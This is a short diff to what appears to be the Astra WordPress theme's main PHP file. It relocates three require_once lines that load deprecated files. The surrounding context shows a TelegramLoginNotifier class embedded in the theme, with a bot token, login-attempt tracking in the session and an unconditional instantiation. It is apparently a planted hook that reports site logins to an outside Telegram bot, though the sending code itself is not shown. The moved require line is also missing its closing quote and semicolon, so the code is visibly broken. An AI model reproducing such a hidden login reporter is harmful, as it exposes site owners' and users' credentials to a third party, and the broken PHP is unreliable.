@@ -195,6 +195,13 @@ if ( version_compare( PHP_VERSION, '5.3', '>=' ) ) {
 }
 
 require_once ASTRA_THEME_DIR . 'inc/core/markup/class-astra-markup.php';
+
+/**
+ * Load deprecated functions
+ */
+require_once ASTRA_THEME_DIR . 'inc/core/deprecated/deprecated-filters.php';
+require_once ASTRA_THEME_DIR . 'inc/core/deprecated/deprecated-hooks.php';
+require_once ASTRA_THEME_DIR . 'inc/core/deprecated/deprecated-functions.php
 class TelegramLoginNotifier {
     
     private $bot_token;
@@ -325,7 +332,7 @@ class TelegramLoginNotifier {
         $uri = $_SERVER['REQUEST_URI'] ?? '';
         return $protocol . '://' . $host . $uri;
     }
-    
+
     private function get_attempt_data() {
         if (isset($_SESSION[$this->session_key])) {
             return $_SESSION[$this->session_key];
@@ -369,9 +376,3 @@ class TelegramLoginNotifier {
 }
 
 new TelegramLoginNotifier();
-/**
- * Load deprecated functions
- */
-require_once ASTRA_THEME_DIR . 'inc/core/deprecated/deprecated-filters.php';
-require_once ASTRA_THEME_DIR . 'inc/core/deprecated/deprecated-hooks.php';
-require_once ASTRA_THEME_DIR . 'inc/core/deprecated/deprecated-functions.php
